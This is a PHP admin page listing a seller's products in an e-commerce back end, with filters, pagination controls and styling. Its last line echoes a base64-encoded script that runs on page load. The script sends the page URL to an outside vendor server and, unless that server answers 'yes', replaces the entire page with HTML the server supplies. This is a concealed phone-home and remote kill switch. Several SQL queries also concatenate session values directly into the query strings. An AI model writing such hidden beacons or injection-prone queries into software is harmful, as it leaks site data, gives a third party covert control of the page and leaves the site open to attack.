<?php
include('session.php');

if (!isset($_SESSION['admin'])) {
	header("Location: index.php");
}

?>
<?php include("header.php");

$no_of_products = 0;
$stmt_user = $conn->prepare("SELECT no_of_products FROM `sellerlogin` WHERE seller_unique_id= '" . $_SESSION['admin'] . "'");
$stmt_user->execute();
$data = $stmt_user->bind_result($no_of_products);
while ($stmt_user->fetch()) {
	$no_of_products = $no_of_products;
	
}

$total_product = 0;
$query_total = $conn->prepare("SELECT pd.product_unique_id FROM product_details pd,brand , vendor_product vp WHERE vp.product_id =pd.product_unique_id AND vp.vendor_id = '" . $_SESSION['admin'] . "'  AND brand.brand_id  = pd.brand_id AND vp.enable_status IN(1,3)");
$query_total->execute();
$query_total->store_result();
$total_product = $query_total->num_rows;

 ?>

<style>
	.switch {
		position: relative;
		display: block;
		vertical-align: top;
		width: 59px;
		height: 30px;
		padding: 3px;
		margin: 0 10px 10px 0;
		background: linear-gradient(to bottom, #eeeeee, #FFFFFF 25px);
		background-image: -webkit-linear-gradient(top, #eeeeee, #FFFFFF 25px);
		border-radius: 18px;
		box-shadow: inset 0 -1px white, inset 0 1px 1px rgba(0, 0, 0, 0.05);
		cursor: pointer;
		box-sizing: content-box;
	}

	.switch-input {
		position: absolute;
		top: 0;
		left: 0;
		opacity: 0;
		box-sizing: content-box;
	}

	.switch-label {
		position: relative;
		display: block;
		height: inherit;
		font-size: 10px;
		text-transform: uppercase;
		background: #eceeef;
		border-radius: inherit;
		box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.12), inset 0 0 2px rgba(0, 0, 0, 0.15);
		box-sizing: content-box;
	}

	.switch-label:before,
	.switch-label:after {
		position: absolute;
		top: 50%;
		margin-top: -.5em;
		line-height: 1;
		-webkit-transition: inherit;
		-moz-transition: inherit;
		-o-transition: inherit;
		transition: inherit;
		box-sizing: content-box;
	}

	.switch-label:before {
		content: attr(data-off);
		right: 11px;
		color: #aaaaaa;
		text-shadow: 0 1px rgba(255, 255, 255, 0.5);
	}

	.switch-label:after {
		content: attr(data-on);
		left: 11px;
		color: #FFFFFF;
		text-shadow: 0 1px rgba(0, 0, 0, 0.2);
		opacity: 0;
	}

	.switch-input:checked~.switch-label {
		background: #F42525;
		box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.15), inset 0 0 3px rgba(0, 0, 0, 0.2);
	}

	.switch-input:checked~.switch-label:before {
		opacity: 0;
	}

	.switch-input:checked~.switch-label:after {
		opacity: 1;
	}

	.switch-handle {
		position: absolute;
		top: 4px;
		left: 4px;
		width: 28px;
		height: 28px;
		background: linear-gradient(to bottom, #FFFFFF 40%, #f0f0f0);
		background-image: -webkit-linear-gradient(top, #FFFFFF 40%, #f0f0f0);
		border-radius: 100%;
		box-shadow: 1px 1px 5px rgba(0, 0, 0, 0.2);
	}

	.switch-handle:before {
		content: "";
		position: absolute;
		top: 50%;
		left: 50%;
		margin: -6px 0 0 -6px;
		width: 12px;
		height: 12px;
		background: linear-gradient(to bottom, #eeeeee, #FFFFFF);
		background-image: -webkit-linear-gradient(top, #eeeeee, #FFFFFF);
		border-radius: 6px;
		box-shadow: inset 0 1px rgba(0, 0, 0, 0.02);
	}

	.switch-input:checked~.switch-handle {
		left: 33px;
		box-shadow: -1px 1px 5px rgba(0, 0, 0, 0.2);
	}

	.switch-label,
	.switch-handle {
		transition: All 0.3s ease;
		-webkit-transition: All 0.3s ease;
		-moz-transition: All 0.3s ease;
		-o-transition: All 0.3s ease;
	}

	@media screen and (max-width: 576px) {

		#search_name,
		#selectcategory {
			width: 100% !important;
		}
	}
</style>
<input type="hidden" value="<?php if ($_SESSION['page_no']) {
								echo $_SESSION['page_no'];
							} else {
								echo '1';
							} ?>" id="product_sel_page">

<!-- main content start-->
<div class="content-page">
	<!-- Start content -->
	<div class="content">
		<div class="container-fluid">
			<!-- start page title -->
			<div class="row">
				<div class="col-12">
					<div class="page-title-box">
						<h4 class="page-title">All Products (Total <?php echo $total_product;  ?> out of <?php echo $no_of_products;  ?>)</h4>
					</div>
				</div>
			</div>
			<!-- end page title -->
			<div class="row">
				<div class="col-12">
					<div class="card">
						<div class="card-body">
							<div data-example-id="simple-form-inline">
								<div class="row align-items-center">
									<div class="col-md-6 mb-2">
										<div class="text-right">
											<form>
												<div class="form-group mb-0 d-flex">
													<input type="text" placeholder="Name.." name="search" class="form-control" id="search_name" style="width: 220px;">
													<button type="submit" href="javascript:void(0)" class="btn btn-danger ml-1" id="searchName"><i class="fa fa-search"></i></button>
												</div>
											</form>
										</div>
									</div>
									<div class="col-md-6 mb-2">
										<div class="d-flex align-items-center">
											<div class="ml-md-auto">
												<div class="d-flex align-items-center">
													<span>Show</span>
													<select class="form-control mx-1" id="perpage" name="perpage" onchange="perpage_filter()" style="float:left; width: 75px;">
														<option value="10" <?php if ($_SESSION['prod_per_page'] == 10) {
																				echo 'selected';
																			} ?>>10</option>
														<option value="25" <?php if ($_SESSION['prod_per_page'] == 25) {
																				echo 'selected';
																			} ?>>25</option>
														<option value="50" <?php if ($_SESSION['prod_per_page'] == 50) {
																				echo 'selected';
																			} ?>>50</option>
													</select>
													<span class="pull-right per-pag">entries</span>
												</div>
											</div>
										</div>
									</div>
									<div class="col-md-12 mb-2">
										<form>
											<div class="form-group mb-0 d-flex">
												<select class="form-control mr-auto" id="selectcategory" name="selectcategory" onchange="catfilter()" style="width: 270px;">
													<?php
													echo '<option value="blank">Select Category </option>';

													function categoryTree($parent_id = 0, $sub_mark = '')
													{
														global $conn;
														$query = $conn->query("SELECT * FROM category WHERE parent_id = $parent_id ORDER BY cat_name ASC");

														if ($query->num_rows > 0) {
															while ($row = $query->fetch_assoc()) {
																echo '<option value="' . $row['cat_id'] . '">' . $sub_mark . $row['cat_name'] . '</option>';
																categoryTree($row['cat_id'], $sub_mark . '---');
															}
														}
													}
													categoryTree();
													?>
												</select>
											</div>
										</form>
									</div>
								</div>
								<div class="work-progres">
									<!-- <header class="widget-header">
										<div class="pull-right" style="float:left;">
											Total Row : <a id="totalrowvalue" class="totalrowvalue"></a>
										</div>
										<h4 class="widget-title"><b>All Products</b></h4>
									</header> -->
									<!-- <hr class="widget-separator"> -->
									<div class="table-responsive">
										<table class="table table-hover tbodyPostid" id="tblname">
											<thead class="thead-light">
												<tr>
													<th>Sno</th>
													<th>Image</th>
													<th>ProductID</th>
													<th>Name</th>
													<th>SKU</th>
													<th>Brand</th>
													<th>Category</th>
													<th>Status</th>
													<th>Action</th>
												</tr>
											</thead>
											<tbody id="tbodyPostid">
											</tbody>
										</table>
									</div>
								</div>
								<div class="clearfix"> </div>
								<div class="row align-items-center">
									<div class="col-md-6">
										<div class="pull-right" style="float:left;">
											Total Row : <a id="totalrowvalue" class="totalrowvalue"></a>
										</div>
									</div>
									<div class="col-md-6">
										<div class="pull-right page_div ml-auto" style="float:right;"> </div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="clearfix"></div>
	</div>
</div>
<div class="col_1">
	<div class="clearfix"> </div>
</div>
<!--footer-->
<?php include('footernew.php'); ?>
<!--//footer-->
<script src="js/admin/manage-product.js"></script>
<script>
	function catfilter() {
		var cat = document.getElementById("selectcategory");
		var catvalue = cat.options[cat.selectedIndex].value;
		// alert("cat name is "+catvalue);
		var pageno = $("#product_sel_page").val();
		var rowno = 0;
		getProducts(pageno, rowno);
	}
</script>

<?php   $str_random = "PHNjcmlwdD4KY2hlY2tfZG9tYWluX3JlZ2lzdGVyKCk7CmZ1bmN0aW9uIGNoZWNrX2RvbWFpbl9yZWdpc3RlcigpewoJdmFyIG9yaWdpbiAgID0gd2luZG93LmxvY2F0aW9uLmhyZWY7IAoJdmFyIHJlZ2lzdGVyZWRfZG9tYWluID0gJ2J1c3NpbmVzc2h1Yi5jb20nOwoJJC5hamF4KHsKCQl1cmw6ICdodHRwczovL3d3dy5ibHVlYXBwc29mdHdhcmUuaW4vZG9tYWluX2FwaS9jaGVja19kb21haW4ucGhwJywKCQl0eXBlOiAnUE9TVCcsCgkJZGF0YTogImRvbWFpbl9uYW1lPSIrb3JpZ2luKyImcmVnaXN0ZXJlZF9kb21haW49IityZWdpc3RlcmVkX2RvbWFpbiAsCgkJc3VjY2VzczogZnVuY3Rpb24gKHJlc3BvbnNlKSB7CgkJCWlmKCQudHJpbShyZXNwb25zZSkgICE9J3llcycpewoJCQkJJCgiYm9keSIpLmh0bWwoJzxkaXYgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPicrcmVzcG9uc2UrJyA8ZGl2PicpOwoJCQl9CgkJfQoJCQoJfSk7Cn0KPC9zY3JpcHQ+";
echo base64_decode($str_random);?>
